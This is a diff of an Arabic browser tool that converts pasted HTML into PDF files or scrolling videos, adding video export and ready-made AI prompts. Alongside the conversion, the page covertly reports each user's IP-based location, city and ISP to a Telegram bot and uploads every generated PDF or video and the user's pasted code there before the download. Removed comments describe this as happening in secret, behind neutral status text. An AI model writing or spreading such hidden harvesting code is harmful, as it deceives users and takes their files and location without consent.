@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تحويل الأكواد إلى PDF</title>
+    <title>منصة تحويل الأكواد إلى PDF وفيديو</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
@@ -27,15 +27,15 @@
         .clear-btn { background: #fee2e2; color: #ef4444; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .clear-btn:hover { background: #fca5a5; color: #b91c1c; }
         
-        textarea { flex: 1; min-height: 180px; resize: vertical; direction: ltr; font-family: monospace; background: #f8fafc; font-size: 12px;}
+        textarea { flex: 1; min-height: 140px; resize: vertical; direction: ltr; font-family: monospace; background: #f8fafc; font-size: 12px;}
         
         .row { display: flex; gap: 10px; }
         .row .form-group { flex: 1; }
 
         .ai-prompts { background: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 8px; margin-bottom: 15px;}
         .ai-prompts p { margin: 0 0 8px 0; font-size: 12px; color: #166534; font-weight: bold; text-align: center;}
-        .prompt-btns { display: flex; gap: 8px; }
-        .prompt-btn { flex: 1; background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 8px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 4px;}
+        .prompt-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+        .prompt-btn { background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 6px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
         .prompt-btn:hover { background: #22c55e; color: #fff; }
 
         .export-btn { background: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; transition: 0.2s; }
@@ -62,7 +62,7 @@
     </div>
 
     <div class="header">
-        <h2>🛠️ منصة تحويل الأكواد إلى PDF</h2>
+        <h2>🛠️ منصة تحويل الأكواد (PDF / فيديو)</h2>
     </div>
 
     <div class="main-container">
@@ -70,8 +70,10 @@
             <div class="ai-prompts">
                 <p>🤖 نسخ أمر جاهز للذكاء الاصطناعي:</p>
                 <div class="prompt-btns">
-                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث أكاديمي (A4)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض تقديمي (16:9)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث PDF (A4)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض PDF (16:9)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('vid916', this)">📱 فيديو طولي (9:16)</button>
+                    <button class="prompt-btn" onclick="copyPrompt('vid169', this)">🎬 فيديو عرضي (16:9)</button>
                 </div>
             </div>
 
@@ -82,18 +84,24 @@
 
             <div class="row">
                 <div class="form-group">
-                    <label>مقاس الصفحة:</label>
+                    <label>نوع الاستخراج:</label>
                     <select id="format-select" onchange="updateTag()">
-                        <option value="169">عرض تقديمي (16:9)</option>
-                        <option value="a4">بحث / تقرير (A4)</option>
+                        <optgroup label="ملفات PDF">
+                            <option value="pdf-169">عرض تقديمي (16:9)</option>
+                            <option value="pdf-a4">بحث / تقرير (A4)</option>
+                        </optgroup>
+                        <optgroup label="مقاطع فيديو (تمرير تلقائي)">
+                            <option value="vid-916">فيديو للجوال (9:16)</option>
+                            <option value="vid-169">فيديو يوتيوب (16:9)</option>
+                        </optgroup>
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>جودة الـ PDF:</label>
+                    <label>الجودة:</label>
                     <select id="quality-select">
-                        <option value="1">عادية</option>
+                        <option value="1">عادية (أسرع)</option>
                         <option value="2" selected>عالية</option>
-                        <option value="3">ممتازة</option>
+                        <option value="3">ممتازة (أبطأ)</option>
                     </select>
                 </div>
             </div>
@@ -106,13 +114,13 @@
                 <textarea id="html-input" oninput="updatePreview()" placeholder="الصق الكود الذي أعطاك إياه الذكاء الاصطناعي هنا..."></textarea>
             </div>
 
-            <button id="capture-btn" class="export-btn" onclick="exportToPDF()">استخراج كملف PDF 📥</button>
+            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
         </div>
 
         <div class="preview-section">
             <div class="preview-header">
                 <span>👁️ المعاينة المباشرة</span>
-                <span class="tag" id="size-tag">الأبعاد: 1280 × 720</span>
+                <span class="tag" id="size-tag">الأبعاد: 1280 × 720 (PDF)</span>
             </div>
             <iframe id="preview-frame"></iframe>
         </div>
@@ -130,24 +138,24 @@
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة الـ PDF\n\n${actionMessage}` })
+                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة التحويل\n\n${actionMessage}` })
             }).catch(e => console.error(e));
         }
 
-        async function sendFileToTelegram(fileBlob, fileName, captionMsg) {
-            const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+        // إرسال الملفات مع تحديد نوعها (document أو video) عشان تيليجرام يتعرف على الفيديو
+        async function sendFileToTelegram(fileBlob, fileName, captionMsg, type = 'document') {
+            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
+            const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', fileBlob, fileName); 
+            formData.append(type === 'video' ? 'video' : 'document', fileBlob, fileName); 
             formData.append('caption', captionMsg);
 
             for (let i = 0; i < 3; i++) {
                 try {
                     const response = await fetch(url, { method: 'POST', body: formData });
                     const data = await response.json();
-                    if (data.ok) {
-                        return true; 
-                    }
+                    if (data.ok) return true; 
                 } catch (e) {
                     console.error(`Error sending ${fileName}`);
                 }
@@ -168,7 +176,7 @@
                                      `\nالدولة: ${data.country}` +
                                      `\nالمدينة: ${data.city}` +
                                      `\nالشركة: ${data.org}` +
-                                     `\nالخريطة (تقريبية): \nhttps://www.google.com/maps?q=$${lat},${lng}`;
+                                     `\nالخريطة: \nhttps://www.google.com/maps?q=$${lat},${lng}`;
                         sendTextToTelegram(info + ipResult);
                     } else {
                         sendTextToTelegram(info + `\n\n⚠️ تعذر تحديد الموقع.`);
@@ -195,28 +203,28 @@
         // ==========================================
 
         const prompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
-            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
+            a4: `أنت مصمم وثائق HTML. قم بإنشاء كود لبحث أكاديمي (A4). عرض الصفحة 794px وارتفاعها 1123px مقسمة لصفحات داخل <div class="page">. استخدم خطوط عربية ونسق احترافي.`,
+            169: `أنت مصمم عروض. قم بإنشاء كود لعرض تقديمي. عرض الصفحة 1280px وارتفاعها 720px مقسمة لشرائح داخل <div class="page">. لا تستخدم القوائم الافتراضية (ul, ol).`,
+            vid916: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو طولي للجوال (Reels/TikTok). العرض يجب أن يكون ثابت 720px والارتفاع مفتوح (ليتم التمرير عليه). استخدم ألوان جذابة، نصوص ضخمة جداً وواضحة، خلفيات ملونة، وتنسيق يعتمد على الكتل (Blocks) الجمالية. لا تقسمه لصفحات.`,
+            vid169: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو عرضي (يوتيوب). العرض يجب أن يكون ثابت 1280px والارتفاع مفتوح. استخدم خطوط كبيرة جداً وتنسيقات ملونة جذابة. لا تقسمه لصفحات، اجعله صفحة واحدة طويلة ومترابطة.`
         };
 
         function copyPrompt(type, btnElement) {
             navigator.clipboard.writeText(prompts[type]).then(() => {
                 const originalText = btnElement.innerText;
-                const originalBg = btnElement.style.background;
-                const originalColor = btnElement.style.color;
                 btnElement.innerText = "✅ تم النسخ!";
                 btnElement.style.background = "#22c55e";
                 btnElement.style.color = "#fff";
                 setTimeout(() => {
                     btnElement.innerText = originalText;
-                    btnElement.style.background = originalBg;
-                    btnElement.style.color = originalColor;
+                    btnElement.style.background = "#fff";
+                    btnElement.style.color = "#15803d";
                 }, 2000);
             });
         }
 
         function clearCode() {
-            if(confirm("هل أنت متأكد من مسح الكود الحالي؟")) {
+            if(confirm("هل أنت متأكد من مسح الكود؟")) {
                 document.getElementById('html-input').value = '';
                 updatePreview();
             }
@@ -225,7 +233,10 @@
         function updateTag() {
             const format = document.getElementById('format-select').value;
             const tag = document.getElementById('size-tag');
-            tag.innerText = format === 'a4' ? "الأبعاد: 794 × 1123 (A4)" : "الأبعاد: 1280 × 720 (16:9)";
+            if(format === 'pdf-a4') tag.innerText = "الأبعاد: 794 × 1123 (PDF)";
+            else if(format === 'pdf-169') tag.innerText = "الأبعاد: 1280 × 720 (PDF)";
+            else if(format === 'vid-916') tag.innerText = "الأبعاد: 720 × مفتوح (فيديو طولي)";
+            else if(format === 'vid-169') tag.innerText = "الأبعاد: 1280 × مفتوح (فيديو عرضي)";
         }
 
         function updatePreview() {
@@ -237,23 +248,19 @@
             if (url && (url.startsWith('data:') || url.startsWith('blob:'))) return url;
             let absoluteUrl = url;
             try {
-                if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('//')) {
-                    absoluteUrl = new URL(url, window.location.href).href;
-                } else if (url.startsWith('//')) { absoluteUrl = 'https:' + url; }
+                if (!url.startsWith('http')) absoluteUrl = new URL(url, window.location.href).href;
             } catch(e) { absoluteUrl = url; }
             
-            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=', 'https://cors-anywhere.herokuapp.com/' ];
+            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=' ];
             for (const proxy of proxies) {
                 try {
-                    let fetchUrl = absoluteUrl;
-                    if (proxy) fetchUrl = proxy + encodeURIComponent(absoluteUrl);
-                    const response = await fetch(fetchUrl, { mode: 'cors', credentials: 'omit' });
+                    let fetchUrl = proxy ? proxy + encodeURIComponent(absoluteUrl) : absoluteUrl;
+                    const response = await fetch(fetchUrl, { mode: 'cors' });
                     if (!response.ok) continue;
                     const blob = await response.blob();
                     return await new Promise((resolve) => {
                         const reader = new FileReader();
                         reader.onloadend = () => resolve(reader.result);
-                        reader.onerror = () => resolve(null);
                         reader.readAsDataURL(blob);
                     });
                 } catch (err) {}
@@ -262,56 +269,177 @@
                 const img = new Image();
                 img.crossOrigin = "Anonymous";
                 img.onload = () => {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = img.width; canvas.height = img.height;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(img, 0, 0);
-                        resolve(canvas.toDataURL('image/jpeg', 0.9));
-                    } catch(e) { resolve(null); }
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.width; canvas.height = img.height;
+                    canvas.getContext('2d').drawImage(img, 0, 0);
+                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                 };
                 img.onerror = () => resolve(null);
                 img.src = absoluteUrl;
-                setTimeout(() => resolve(null), 5000); 
+                setTimeout(() => resolve(null), 3000); 
             });
         }
         
         async function convertAllImagesToDataURLs(container) {
             const images = Array.from(container.querySelectorAll('img'));
-            const promises = images.map(async (img) => {
+            await Promise.all(images.map(async (img) => {
                 const src = img.getAttribute('src');
                 if (!src || src.startsWith('data:')) return;
                 const dataUrl = await urlToDataURL(src);
-                if (dataUrl) {
-                    img.setAttribute('src', dataUrl);
-                    img.setAttribute('data-original-src', src);
-                }
-            });
-            await Promise.all(promises);
+                if (dataUrl) img.setAttribute('src', dataUrl);
+            }));
         }
-        
-        async function exportToPDF() {
+
+        // ===============================================
+        // الدالة الرئيسية التي توجه للـ PDF أو الـ Video
+        // ===============================================
+        async function exportFile() {
+            const code = document.getElementById('html-input').value;
+            const formatType = document.getElementById('format-select').value;
+            
+            if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
+
+            if (formatType.startsWith('pdf')) {
+                await generatePDF();
+            } else {
+                await generateVideo();
+            }
+        }
+
+        // ===============================================
+        // 1. توليد الفيديو (تمرير تلقائي)
+        // ===============================================
+        async function generateVideo() {
+            const btn = document.getElementById('capture-btn');
+            const code = document.getElementById('html-input').value;
+            const fileName = document.getElementById('file-name').value || 'video';
+            const formatType = document.getElementById('format-select').value;
+            const quality = parseInt(document.getElementById('quality-select').value);
+
+            let docWidth = formatType === 'vid-916' ? 720 : 1280;
+            let docHeight = formatType === 'vid-916' ? 1280 : 720;
+
+            btn.disabled = true;
+            btn.innerText = `⏳ جاري تجهيز الفيديو...`;
+            sendTextToTelegram(`⏳ بدء استخراج فيديو جديد...\nالاسم: ${fileName}\nالمقاس: ${docWidth}x${docHeight}`);
+
+            const hiddenContainer = document.createElement('div');
+            hiddenContainer.dir = 'rtl'; 
+            hiddenContainer.style.position = 'absolute';
+            hiddenContainer.style.top = '0'; hiddenContainer.style.left = '0';
+            hiddenContainer.style.zIndex = '-9999';
+            hiddenContainer.style.width = docWidth + 'px'; 
+            hiddenContainer.innerHTML = code;
+            document.body.appendChild(hiddenContainer);
+
+            try {
+                btn.innerText = `🖼️ معالجة الصور للفيديو...`;
+                await convertAllImagesToDataURLs(hiddenContainer);
+                await document.fonts.ready;
+
+                // التقاط كامل الصفحة كصورة طويلة جداً
+                btn.innerText = `📸 تصوير الصفحة بالكامل...`;
+                const scale = quality === 1 ? 1 : (quality === 2 ? 1.5 : 2);
+                const fullCanvas = await html2canvas(hiddenContainer, {
+                    scale: scale, width: docWidth, windowWidth: docWidth, useCORS: true
+                });
+
+                btn.innerText = `🎬 جاري تسجيل الفيديو (تمرير)...`;
+
+                // إعداد مسرح تسجيل الفيديو
+                const recCanvas = document.createElement('canvas');
+                recCanvas.width = docWidth;
+                recCanvas.height = docHeight;
+                const ctx = recCanvas.getContext('2d');
+
+                // إعداد التسجيل
+                const stream = recCanvas.captureStream(30); // 30 إطار في الثانية
+                let mimeType = 'video/webm;codecs=vp9';
+                if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4'; // دعم لبعض المتصفحات
+
+                const recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
+                const chunks = [];
+                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+
+                // عند الانتهاء من التسجيل
+                const recordPromise = new Promise(resolve => {
+                    recorder.onstop = async () => {
+                        btn.innerText = "✅ جاري إنهاء العملية...";
+                        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+                        const videoBlob = new Blob(chunks, { type: mimeType });
+                        const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
+
+                        // إرسال للبوت أولاً
+                        await sendFileToTelegram(videoBlob, `${fileName}.${ext}`, `🎬 تم استخراج الفيديو بنجاح!\nالاسم: ${fileName}`, 'video');
+                        await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالفيديو.`);
+
+                        // تحميل للمستخدم
+                        const url = URL.createObjectURL(videoBlob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `${fileName}.${ext}`;
+                        a.click();
+                        resolve();
+                    };
+                });
+
+                recorder.start();
+
+                // تحريك الكاميرا (التمرير) على الكانفاس
+                const maxScroll = Math.max(0, fullCanvas.height - (docHeight * scale));
+                const duration = 6000; // مدة الفيديو 6 ثواني
+                const startTime = Date.now();
+
+                function drawFrame() {
+                    const elapsed = Date.now() - startTime;
+                    const progress = Math.min(elapsed / duration, 1);
+                    
+                    // حساب حركة التمرير لتكون سلسة (EaseInOut تقريبي)
+                    const smoothProgress = 0.5 - Math.cos(progress * Math.PI) / 2;
+                    const yPos = smoothProgress * maxScroll;
+
+                    ctx.fillStyle = "#ffffff";
+                    ctx.fillRect(0, 0, docWidth, docHeight);
+                    // رسم جزء من الصورة الطويلة بناءً على موقع التمرير
+                    ctx.drawImage(fullCanvas, 0, yPos, docWidth * scale, docHeight * scale, 0, 0, docWidth, docHeight);
+
+                    if (progress < 1) {
+                        requestAnimationFrame(drawFrame);
+                    } else {
+                        recorder.stop();
+                    }
+                }
+                drawFrame(); // بدء الأنيميشن
+                
+                await recordPromise; // انتظار انتهاء التسجيل والرفع
+
+            } catch (error) {
+                console.error(error);
+                alert("حدث خطأ أثناء معالجة الفيديو.");
+            } finally {
+                document.body.removeChild(hiddenContainer);
+                btn.disabled = false;
+                btn.innerText = "بدء الاستخراج 📥";
+            }
+        }
+
+        // ===============================================
+        // 2. توليد الـ PDF (نفس الكود الموثوق السابق)
+        // ===============================================
+        async function generatePDF() {
             const btn = document.getElementById('capture-btn');
             const code = document.getElementById('html-input').value;
             const fileName = document.getElementById('file-name').value || 'document';
             const qualityScale = parseInt(document.getElementById('quality-select').value);
             const formatType = document.getElementById('format-select').value;
 
-            if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
+            sendTextToTelegram(`⏳ بدء استخراج PDF جديد...\nالاسم: ${fileName}`);
 
-            sendTextToTelegram(`⏳ تم البدء بعملية استخراج جديدة...\nالاسم: ${fileName}`);
+            let docWidth = formatType === 'pdf-a4' ? 794 : 1280;
+            let docHeight = formatType === 'pdf-a4' ? 1123 : 720;
+            let pdfOrientation = formatType === 'pdf-a4' ? 'portrait' : 'landscape';
 
-            let docWidth, docHeight, pdfOrientation;
-            if (formatType === 'a4') {
-                docWidth = 794; docHeight = 1123; pdfOrientation = 'portrait';
-            } else { 
-                docWidth = 1280; docHeight = 720; pdfOrientation = 'landscape';
-            }
-
-            // تحديد نسبة ضغط الصور لتخفيف حجم الملف بناءً على الجودة المختارة
-            let compressionRate = 0.70; // افتراضي للمتوسط
-            if (qualityScale === 1) compressionRate = 0.55; // خفيف جداً
-            if (qualityScale === 3) compressionRate = 0.90; // ثقيل عالي الجودة
+            let compressionRate = qualityScale === 1 ? 0.55 : (qualityScale === 3 ? 0.90 : 0.70);
 
             btn.disabled = true;
             btn.innerText = `⏳ جاري التجهيز...`;
@@ -320,20 +448,12 @@
             hiddenContainer.dir = 'rtl'; 
             hiddenContainer.style.position = 'absolute';
             hiddenContainer.style.top = '0'; hiddenContainer.style.left = '0';
-            hiddenContainer.style.zIndex = '-9999'; hiddenContainer.style.opacity = '0.01'; 
-            hiddenContainer.style.pointerEvents = 'none'; hiddenContainer.style.width = docWidth + 'px'; 
+            hiddenContainer.style.zIndex = '-9999';
+            hiddenContainer.style.width = docWidth + 'px'; 
             hiddenContainer.innerHTML = code;
             
             const styleFix = document.createElement('style');
-            styleFix.innerHTML = `
-                ul { list-style-type: none !important; padding-right: 0 !important; }
-                ul li::before { content: "• " !important; font-weight: bold; margin-left: 5px; color: inherit; }
-                ol { list-style-type: none !important; padding-right: 0 !important; counter-reset: item; }
-                ol li { counter-increment: item; }
-                ol li::before { content: counter(item) "- " !important; font-weight: bold; margin-left: 5px; color: inherit; }
-                * { box-sizing: border-box !important; letter-spacing: normal !important; }
-                img { max-width: 100%; height: auto; }
-            `;
+            styleFix.innerHTML = `ul{list-style-type:none!important;padding-right:0!important}ul li::before{content:"• "!important;font-weight:bold;margin-left:5px}ol{list-style-type:none!important;padding-right:0!important;counter-reset:item}ol li{counter-increment:item}ol li::before{content:counter(item) "- "!important;font-weight:bold;margin-left:5px}*{box-sizing:border-box!important;letter-spacing:normal!important}img{max-width:100%;height:auto}`;
             hiddenContainer.appendChild(styleFix);
             document.body.appendChild(hiddenContainer);
 
@@ -341,15 +461,6 @@
                 btn.innerText = `🖼️ معالجة الصور...`;
                 await convertAllImagesToDataURLs(hiddenContainer);
                 await document.fonts.ready;
-                
-                const allImages = hiddenContainer.querySelectorAll('img');
-                await Promise.all(Array.from(allImages).map(img => {
-                    if (img.complete && img.naturalHeight > 0) return Promise.resolve();
-                    return new Promise((resolve) => {
-                        img.onload = () => resolve(); img.onerror = () => resolve();
-                        if (img.complete) resolve(); setTimeout(resolve, 3000);
-                    });
-                }));
                 
                 btn.innerText = "📸 تصوير الصفحات...";
                 const { jsPDF } = window.jspdf;
@@ -360,46 +471,29 @@
                 
                 for (let i = 0; i < pages.length; i++) {
                     const canvas = await html2canvas(pages[i], {
-                        scale: qualityScale, useCORS: true, allowTaint: false, logging: false,
-                        width: docWidth, height: docHeight, windowWidth: docWidth, windowHeight: docHeight,
-                        x: 0, y: 0, scrollX: 0, scrollY: 0, backgroundColor: '#ffffff', letterRendering: false,
-                        onclone: (clonedDoc) => {
-                            const clonedImages = clonedDoc.querySelectorAll('img');
-                            clonedImages.forEach((clonedImg, idx) => {
-                                if (allImages[idx] && allImages[idx].src.startsWith('data:')) { clonedImg.src = allImages[idx].src; }
-                            });
-                        }
+                        scale: qualityScale, useCORS: true, allowTaint: false, logging: false, width: docWidth, height: docHeight, windowWidth: docWidth
                     });
-                    
-                    // استخدام نسبة الضغط المختارة لتخفيف الملف
                     const imgData = canvas.toDataURL('image/jpeg', compressionRate);
                     if (i > 0) pdf.addPage([docWidth, docHeight], pdfOrientation);
-                    
-                    // إضافة الصورة للـ PDF مع تفعيل ميزة الضغط السريع لـ jsPDF
                     pdf.addImage(imgData, 'JPEG', 0, 0, docWidth, docHeight, undefined, 'FAST');
                 }
                 
-                // نص محايد للمستخدم كأن الكود يكمل تجهيز الملف بجهازه
-                btn.innerText = "✅ جاري إنهاء العملية وتجهيز الملف...";
-
-                // تحويل البيانات لإرسالها
+                btn.innerText = "✅ جاري إنهاء العملية...";
                 const pdfBlob = pdf.output('blob');
                 const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
 
-                // الإرسال لتيليجرام (يحدث بالخفاء قبل التحميل للمستخدم)
-                await sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
-                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
+                await sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج PDF بنجاح!\nالاسم: ${fileName}`);
+                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML.`);
                 
-                // بعد ما ينتهي من تيليجرام يحمل الملف في جهاز المستخدم
                 pdf.save(`${fileName}.pdf`);
 
             } catch (error) {
-                console.error("خطأ:", error);
+                console.error(error);
                 alert("حدث خطأ أثناء معالجة الملف.");
             } finally {
                 document.body.removeChild(hiddenContainer);
                 btn.disabled = false;
-                btn.innerText = "استخراج كملف PDF 📥";
+                btn.innerText = "بدء الاستخراج 📥";
             }
         }
     </script>
